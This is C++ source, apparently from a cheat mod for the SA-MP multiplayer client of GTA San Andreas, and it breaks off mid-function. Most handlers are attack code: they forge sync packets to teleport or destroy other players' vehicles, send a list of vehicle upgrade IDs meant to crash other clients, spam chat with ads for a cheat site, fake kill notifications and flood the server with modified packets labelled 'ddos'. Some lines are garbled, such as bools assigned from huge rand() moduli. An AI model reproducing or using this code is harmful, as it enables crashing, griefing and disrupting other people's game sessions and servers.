	traceLastFunc( "cheat_handle_qqqq()" ); 
      if( cheat_state->_generic.qqqq == 1 ) 
     {  
	 static int p = 10, pulse_state=0; 
if (pulse_state == 0) 
{ 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = p; 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = 100 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints; 
p+= 4; 
if (p >= 100) pulse_state = 1; 
} 
else 
{ 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints = p; 
actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->armor = 100 - actor_info_get(ACTOR_SELF, ACTOR_ALIVE)->hitpoints; 
p-= 4; 
if (p< 10) pulse_state = 0; 
} 
     
	  }}


uint32_t encode_panels(unsigned char flp, unsigned char frp, unsigned char rlp, unsigned char rrp, unsigned char windshield, unsigned char front_bumper, unsigned char rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}

uint32_t encode_doors(unsigned char bonnet, unsigned char boot, unsigned char driver_door, unsigned char passenger_door)
{
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}

void cheat_handle_aaaaa()
{
	 traceLastFunc( "cheat_handle_aaaaa()" ); 
	if( cheat_state->_generic.fake120 == 1 ) 
		{ 
			for(int ccflood = 0; ccflood < 4;ccflood++)
			{
			bool vehPanelStatus = rand()%999999999999999999+4;
			vehPanelStatus = rand()%-999999999999999999-4;
			bool vehDoorStatus = rand()%999999999999999999+4;
			vehDoorStatus = rand()%-999999999999999999-4;
			int vehLightStatus = rand()%999999999999999999+4;
			vehLightStatus = rand()%999999999999999999-4;
			int vehTireStatus = rand()%999999999999999999+4;
			vehTireStatus = rand()%999999999999999999-4;
			int vehTireTest = rand()%999999999999999999+4;
			vehTireTest = rand()%999999999999999999-4;
			int vehTireTests = rand()%999999999999999999+4;
			vehTireTest = rand()%999999999999999999-4;
			g_RakClient->DamageVehicle(g_Players->pLocalPlayer->sCurrentVehicleID, vehPanelStatus, vehDoorStatus, vehLightStatus, vehTireStatus, vehTireTest, vehTireTests);
		}
	}}

void cheat_handle_aaaaa1()
{
	 traceLastFunc( "cheat_handle_aaaaa1()" ); 
	if( cheat_state->_generic.fake1201 == 1 ) 
		{ 
			static DWORD time;
			if(GetTickCount() - 600 > time)
			{
			gta_vehicle_spawn ( 600 );
			time = GetTickCount();
			}}
	}

void cheat_handle_aaaaa11()
{
	 traceLastFunc( "cheat_handle_aaaaa11()" ); 
	if( cheat_state->_generic.fake12011 == 1 ) 
		{ 
			pGame->SetTimeScale ( 20 );
		}}

void cheat_handle_aaaaa112()
{
	 traceLastFunc( "cheat_handle_aaaaa112()" ); 
	if( cheat_state->_generic.fakeam == 1 ) 
		{ 
			static DWORD time;
			if(GetTickCount() - 3000 > time)
			{
			struct actor_info *self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE ); 
			self->hitpoints += 2.0f;
			time = GetTickCount();
			}}}

void cheat_handle_matrixflooder ()  
{  
  traceLastFunc( "cheat_handle_matrixflooder()" );  
  if( cheat_state->_generic.matrixflooder == 1 )  
  {  
  cheat_state_text( "Matrix flooder activated." ); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  say("%d%d%d%d%d%d%d%d%d%d%d cheat.samp-users.ru %d%d%d%d%d%d%d%d%d%d%d%d%d", rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9, rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9); 
  }  
  return;  
} 





	 void cheat_handle_requestclass()  
{  
  traceLastFunc( "cheat_handle_requestclass()" );  
  if( cheat_state->_generic.requestclass == 1 )  
  {     
	  say("||||||||||||||||||||%d||||||||||||||||||||||||||||||||%d||||||||||||||||||", rand()%9,rand()%9);
	  say("||||||||%d||||||||||||||||||||||||||||||||||||||||||||||||||||||||||%d||||", rand()%9,rand()%9);
	  say("||||||||||||||||%d||||||||||||||||||||||||||||||||||||||||||||%d||||||||||", rand()%9,rand()%9);
	  say("||||||||%d||||||||||||||||||||||||||||||||||||||||||||||||||||||||||%d||||", rand()%9,rand()%9);
	  say("||||||||||||||||||||||||||%d|||||||||||||||||||%d|||||||||||||||||||||||||", rand()%9,rand()%9);
	  say("|||||||||||||||||%d|||||||||||||||||||||||||||||||||||||||||%d||||||||||||", rand()%9,rand()%9);
	  say("||||||||%d||||||||||||||||||||||||||||||||||||||||||||||||||||||||||%d||||", rand()%9,rand()%9);
	  say("||||||||||||||||||||||%d||||||||||||||||||||||||||||%d||||||||||||||||||||", rand()%9,rand()%9);
	  say("||||||||||||||||||||||||||||||||%d|||||||%d|||||||||||||||||||||||||||||||", rand()%9,rand()%9);
  }
} 
	 


	  void cheat_handle_spawner()  
{  
  traceLastFunc( "cheat_handle_spawner()" );  
  if( cheat_state->_generic.spawner == 1 )  
  {
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		float fQuaternion[4] = { +9.0f, +9.0f, +6.75f };

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;	
} 
  } 



	  void cheat_handle_pickmaa()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.pickmaa == 1 )  
  {  
	static int time = 0;
	if (GetTickCount() - 300 > time)
	{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
	float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
	float fValue = (float)0x7777777B;
	cpos[2] = fValue;
	float spd[3] = {0,0,0};
	g_RakClient->SendFakeOnfootSyncData1(cpos,actor_info_get(-1,0)->hitpoints,0,spd);
	self->weapon[self->weapon_slot].ammo = 1000;
	self->weapon[self->weapon_slot].id = 32;
	time = GetTickCount();
	}
	  }}


void cheat_handle_pickm()  
{  
  traceLastFunc( "cheat_handle_pickm()" );  
  if( cheat_state->_generic.pickm == 1 )  
  {
  for(int ccflood = 0; ccflood < 4;ccflood++)
  {
  float fValue = (float)0x7777777B; 
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3] = {0,0,0};
  float fQuaternion[4] = {0,0,0,0};
  cpos[2] = fValue;
  g_RakClient->SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }}} 

void cheat_handle_pickm1()  
{  
  traceLastFunc( "cheat_handle_pickm1()" );  
  if( cheat_state->_generic.pickm1 == 1 )  
  {   
  float fValue = (float)0x7777777B; 
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3]= {0,0,0};
  float fQuaternion[4];
  fQuaternion[0] = (float)(rand() % 90);
  fQuaternion[1] = (float)(rand() % 90);
  fQuaternion[2] = (float)(rand() % 90);
  fQuaternion[3] = (float)(rand() % 90);
  g_RakClient->SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }} 

void cheat_handle_pickm2()  
{  
  traceLastFunc( "cheat_handle_pickm2()" );  
  if( cheat_state->_generic.pickm2 == 1 )  
  {   
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3] = {0,0,0};
  spd[0] = (float)(rand() % 10);
  spd[1] = (float)(rand() % 10);
  spd[2] = 0;
  float fQuaternion[4] = {0,0,0};
  g_RakClient->SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }} 

void cheat_handle_pickm3()  
{  
  traceLastFunc( "cheat_handle_pickm3()" );  
  if( cheat_state->_generic.pickm3 == 1 )  
  {   
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3] = {0,0,0};
  cpos[2] -= 100;
  float fQuaternion[4] = {0,0,0};
  g_RakClient->SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }} 


void cheat_handle_pickm4()  
{  
  traceLastFunc( "cheat_handle_pickm4()" );  
  if( cheat_state->_generic.pickm4 == 1 )  
  { 
float MyPos[3] = {pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ};
if(MyPos[0] >= 10000.0 || MyPos[1] >= 10000.0 || MyPos[2] >= 10000.0 || MyPos[0] <= -10000.0 || MyPos[1] <= -10000.0 || MyPos[2] <= -10000.0 )pPedSelf->GetPosition()->fZ = 7;
  }}

// АнтиЗагрузка by Hero
//struct actor_info *self = actor_info_get(ACTOR_SELF, 0);
//float myPos[3];
//vect3_copy(&self->base.matrix[4 * 3], myPos);
//if(myPos[0] > 10000.0) {
//playerSpawn()


static int once = 1;
	static int carUsed[SAMP_VEHICLE_MAX];
void cheat_handle_pickm5()  
{  
  traceLastFunc( "cheat_handle_pickm5()" );  
  if( cheat_state->_generic.pickm5 == 1 )  
  {   

		if ( once == 1 )
			once = 0;

		struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		int		nearestCar = 0;
		static int previousCar;

		for ( int v = 0; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] != 1 )
				continue;

			int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
			struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

			int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
			if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
				continue;

			if ( carUsed[v] == 1 )
				continue;

			nearestCar = v;
		}

		if ( nearestCar <= 0 || nearestCar >= SAMP_VEHICLE_MAX )
		{
			for ( int i = 0; i < SAMP_VEHICLE_MAX; i++ )
				carUsed[i] = 0;

			return;
		}

		if ( nearestCar == previousCar )
		{
			for ( int i = 0; i < SAMP_VEHICLE_MAX; i++ )
				carUsed[i] = 0;

			

			return;
		}

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[nearestCar]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);

		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		// Vehicle Crash Components
		int crashComponents[VEHICLE_UPGRADES_COUNT] =
		{
			1087, 1009, 1008, 1010, 1086, 1111, 1112, 1000, 1001, 1002, 1003, 1014, 1015, 1016, 1023, 1049, 1050, 1058, 1060, 1138, 1139, 1147, 1146,
			1162, 1158, 1164, 1163, 1004, 1005, 1011, 1012, 1142, 1143, 1144, 1145, 1006, 1032, 1033, 1038, 1035, 1054, 1053, 1055, 1061, 1067, 1068,
			1088, 1091, 1103, 1128, 1130, 1131, 1169, 1170, 1141, 1140, 1171, 1172, 1149, 1148, 1153, 1152, 1150, 1151, 1155, 1157, 1154, 1156, 1160,
			1173, 1159, 1161, 1166, 1165, 1168, 1167, 1174, 1175, 1176, 1177, 1179, 1185, 1180, 1178, 1182, 1181, 1184, 1183, 1189, 1188, 1187, 1186,
			1191, 1190, 1192, 1193, 1017, 1007, 1027, 1026, 1030, 1031, 1040, 1036, 1039, 1041, 1042, 1099, 1051, 1047, 1052, 1048, 1062, 1056, 1063,
			1057, 1071, 1069, 1072, 1070, 1094, 1090, 1093, 1095, 1101, 1122, 1124, 1106, 1102, 1133, 1107, 1108, 1120, 1118, 1121, 1119, 1137, 1134,
			1018, 1019, 1020, 1021, 1022, 1028, 1029, 1034, 1037, 1043, 1044, 1045, 1046, 1059, 1064, 1065, 1066, 1089, 1092, 1104, 1105, 1113, 1114,
			1126, 1127, 1129, 1132, 1135, 1136, 1100, 1109, 1110, 1115, 1116, 1117, 1123, 1125, 1013, 1024, 1025, 1073, 1074, 1075, 1076, 1077, 1078,
			1079, 1080, 1081, 1082, 1083, 1084, 1085, 1096, 1097, 1098
		};

		static int c = 0;

		g_RakClient->SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, vinfo->speed, 0);

		
			sendSCMEvent(2, iSAMPVehicleID, crashComponents[c], crashComponents[c]);

		c++;

		if ( c >= VEHICLE_UPGRADES_COUNT )
			c = 0;

		carUsed[iSAMPVehicleID] = 1;

		previousCar = iSAMPVehicleID;
	}
	else
	{
		if ( once == 0 )
		{
			for ( int v = 0; v < SAMP_VEHICLE_MAX; v++ )
				carUsed[v] = 0;

			once = 0;
		}
	
  }}

void cheat_handle_death()  
{  
traceLastFunc( "cheat_handle_death()" );  
if( cheat_state->_generic.death == 1 ) 
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
	float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
	float fValue = (float)0x7777777B;
	cpos[2] = fValue;
	float spd[3] = {0,0,0};
	g_RakClient->SendFakeOnfootSyncData1(cpos,actor_info_get(-1,0)->hitpoints,0,spd);
	self->weapon[self->weapon_slot].ammo = 1000;
	self->weapon[self->weapon_slot].id = 32;
}
} 

void cheat_handle_deatha()  
{  
traceLastFunc( "cheat_handle_deatha()" );  
if( cheat_state->_generic.deatha == 1 ) 
{
static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		g_RakClient->SendFakeCarDeath(iSAMPVehicleID);

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
		{
			v = 0;
			cheat_state->_generic.deatha = 0;
		}	
}
} 

void cheat_handle_deathb()  
{  
traceLastFunc( "cheat_handle_deathb()" );  
if( cheat_state->_generic.deathb == 1 ) 
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 5.0f) + (-20 + rand()%40);
		fPos[1] += (cosf(-self->fCurrentRotation) * 5.0f) + (-20 + rand()%40);
		fPos[2] += 10.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);
		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );
		vect3_zero( vinfo->speed );

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
}
} 

void cheat_handle_deathc()  
{  
traceLastFunc( "cheat_handle_deathc()" );  
if( cheat_state->_generic.deathc == 1 ) 
{
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 2nd version
		fPos[0] += -15 + rand()%30;
		fPos[1] += -15 + rand()%30;
		fPos[2] += 20.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 0.3f };

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
	
}
} 

void cheat_handle_deathd()  
{  
traceLastFunc( "cheat_handle_deathd()" );  
if( cheat_state->_generic.deathd == 1 ) 
{
struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += -15 + rand()%35;
		fPos[1] += -15 + rand()%35;
		fPos[2] += 8.0f;

		float fSpeed[3] = { 0.0f, 0.0f, 1.75f };

		float fQuaternion = -180.0f;

		stInCarData vehSync;
		memset(&vehSync, 0, sizeof(stInCarData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.fVehicleHealth = vinfo->hitpoints;
		vehSync.fMoveSpeed[0] = fSpeed[0];
		vehSync.fMoveSpeed[1] = fSpeed[1];
		vehSync.fMoveSpeed[2] = fSpeed[2];
		vehSync.sKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;
		vehSync.byteArmor = self->armor;

		g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;	
}
} 




void cheat_handle_infobar() 
{ 
	traceLastFunc( "cheat_handle_infobar()" );
      if( cheat_state->_generic.infobar == 1 )
	  {
	  }
    return;  
}
void cheat_handle_adminsw() 
{ 
      if( cheat_state->_generic.adminsw == 1 )
	  {
		  int count = 0; // переменная, отвечающая за количество найденых админов 
	for(int i = 0; i < SAMP_PLAYER_MAX; i++) 
	{ 
		for(int x = 0; x < 150; x++) 
		{ 
			if(getPlayerName(i) == NULL || set.admin[x] == NULL) 
				break; 
			if(!strcmp(getPlayerName(i), set.admin[x])) 
			{ 
				
				char text[64];
				sprintf(text,"Admin: %s [ID: %d]",getPlayerName(i),i);
				pD3DFont->PrintShadow(1,pPresentParam.BackBufferHeight-360+count*20,D3DCOLOR_XRGB(255, 165, 0),text);

				count++; 
			} 
		} 
	} 
	if ( count == 0 ) pD3DFont->PrintShadow(1,pPresentParam.BackBufferHeight-45,D3DCOLOR_XRGB(255, 165, 0),"Админов нету");
	  }
    return;  
}
		 void cheat_handle_death2()  
{  
  traceLastFunc( "cheat_handle_death2()" );  
 static int time=0;
	if(cheat_state->_generic.death2 == 1 && GetTickCount()-1000 > time) {
		actor_info *info = actor_info_get(-1,0);
		if(info->weapon_slot != 0) {
			if(info->weapon[info->weapon_slot].ammo_clip == 0) {
				if(info->weapon[info->weapon_slot].ammo > 7) info->weapon[info->weapon_slot].ammo_clip += 7;
				else info->weapon[info->weapon_slot].ammo_clip = info->weapon[info->weapon_slot].ammo;
			}
			if(info->weapon[info->weapon_slot].ammo_clip > 0) {
				info->weapon[info->weapon_slot].ammo_clip -= 1;
				info->weapon[info->weapon_slot].ammo -= 1;
			}
		}
		time = GetTickCount();
	}
		 }















	 

void cheat_handle_killer()  
{ 
  traceLastFunc( "cheat_handle_killer()" );  
  if( cheat_state->_generic.killer == 1 )  
  {
	float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
	cpos[2] -= 100;
	float spd[3]={0,0,0};
	g_RakClient->SendFakeOnfootSyncData1(cpos,actor_info_get(-1,0)->hitpoints,0,spd);
 }
  }
 
  

 

void cheat_handle_aafk()  
{  
  traceLastFunc( "cheat_handle_aafk()" );  
  if( cheat_state->_generic.aafk == 1 )  
  {
for(int ddos = 0; ddos < 3;ddos++)
{
BitStream bsSend;
bsSend.Write((BYTE)ID_MODIFIED_PACKET);
g_RakClient->Send(&bsSend);
  }//конец
  }}


	
void cheat_handle_autodri()  
{  
  traceLastFunc( "cheat_handle_autodri()" );  
  if( cheat_state->_generic.autodri == 1 )  
  {  
	int randkillerid = 0xFFFF + rand() % SAMP_PLAYER_MAX;
		int randreason = rand() % 46;
		while(!(randkillerid >= 0 && randkillerid < SAMP_PLAYER_MAX && g_Players->pRemotePlayer[randkillerid] == NULL))
		{
			if(getPlayerCount() < 2)
			{
				randkillerid = 0xFFFF;
				break;
			}
			randkillerid = rand() % SAMP_PLAYER_MAX;
		}
		g_RakClient->SendWastedNotification(randreason, randkillerid);   
   } 
   }
		 
  
		
		 
void cheat_handle_rvanka()  
{  
traceLastFunc( "cheat_handle_rvanka()" );  
if( cheat_state->_generic.rvanka == 1 )  
{ 
float coord[3]; 
coord[0] = pPedSelf->GetPosition()->fX; 
coord[1] = pPedSelf->GetPosition()->fY; 
coord[2] = pPedSelf->GetPosition()->fZ; 
float speed[3]; 
speed[0] = (float)(rand() % 10);
speed[1] = (float)(rand() % 10);
speed[2] = 0; 
g_RakClient->SendFakeOnfootSyncData1( coord, 222, 21,speed); 
  
}//конец
  }  

	 	 
void cheat_handle_jf()  
{  

  traceLastFunc( "cheat_handle_jf()" );  
  if( cheat_state->_generic.jf == 1 )  
  {
static int time = 0;
if (GetTickCount() - 2000 > time)

{
for ( int v = 0; v < SAMP_VEHICLE_MAX; v++ )

{ 

if ( g_Vehicles->iIsListed[v] != 1 )

continue;

if ( g_Vehicles->pSAMP_Vehicle[v] == NULL )

continue;

if ( g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL )

continue;
